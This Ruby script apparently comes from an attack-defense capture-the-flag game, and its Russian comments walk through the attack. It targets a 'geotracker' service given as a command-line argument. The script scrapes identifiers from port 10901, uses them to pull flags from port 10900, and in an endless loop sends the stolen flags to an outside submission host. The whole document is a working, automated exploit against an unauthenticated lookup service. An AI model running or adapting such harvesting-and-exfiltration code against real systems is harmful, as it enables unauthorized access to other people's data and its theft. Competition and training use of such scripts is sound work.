#!/usr/bin/env ruby
require 'socket'
require 'timeout'

#########################################
#
#   сервис: geotracker
#    порты: 10900, 10901
# алгоритм:
#   1. коннектимся на порт 10901
#   2. посылаем "\n\n" либо "|POST|lol|abc\n"
#   3. читаем список идентификаторов и еще всякой фигни вида
#       "nkpOqZfzF|7jX_ZgaxuW,ElGSS5zT5c|Ma6w7mVfih,veHCyACHvH|GQcKax69sE,..."
#   4. каждая подстрока между '|' и ',' - это идентификатор
#   5. коннектимся на порт 10900
#   6. для каждого идентификатора посылаем строку вида "7jX_ZgaxuW:0:"
#   7. сервер возвращает либо ключ либо фигню
#   8. goto 1
#
#########################################

OUR_HOST = '10.23.12.3'
FLAG_RE  = /\w{31}=/

# координаты нашей постилки флагов
POST_FLAGS_HOST = "flags.lobotomy.me"
POST_FLAGS_PORT = 12321

#########################################

STDOUT.sync = true

raise "gimme an arg" if ARGV.empty?

@host  = ARGV.first
@ids   = {}
@flags = []

raise "don't attack self!" if @host == OUR_HOST

def _gather_ids
  socket = TCPSocket.new @host, 10901
  socket.write "\n\n"
  s = socket.gets
  s.scan(/\|(\w{10})/).flatten.uniq.each do |id|
    @ids[id] ||= nil
  end
  socket.close
end

def _gather_flags
  socket = TCPSocket.new @host, 10900
  @ids.each do |id,kk|
    next if kk
    socket.write "#{id}:0:\n"
    resp = socket.gets.strip
    @ids[id] = resp
#    p "[d] resp: #{resp}"
    resp.scan(FLAG_RE).each do |flag|
      puts "[.] got flag #{flag}"
      @flags << flag
    end
  end
  socket.close
  @flags.uniq!
end

def _submit_flags
  socket = TCPSocket.new POST_FLAGS_HOST, POST_FLAGS_PORT
  socket.gets
  @flags.each do |flag|
    print "[=] #{flag} .. "
    socket.puts(flag)
    socket.flush
    puts socket.gets
  end
  socket.close
  @flags = []
end

def gather_ids
  Timeout.timeout(60){ _gather_ids }
rescue
  puts "[!] #{$!}"
end

def gather_flags
  Timeout.timeout(60){ _gather_flags }
rescue
  puts "[!] #{$!}"
end

def submit_flags
  Timeout.timeout(60){ _submit_flags }
rescue
  puts "[!] #{$!}"
end

while true do
  gather_flags while @ids.any?{ |id,answer| answer.nil? }
  submit_flags if @flags.any?
  gather_ids

  sleep 5
end
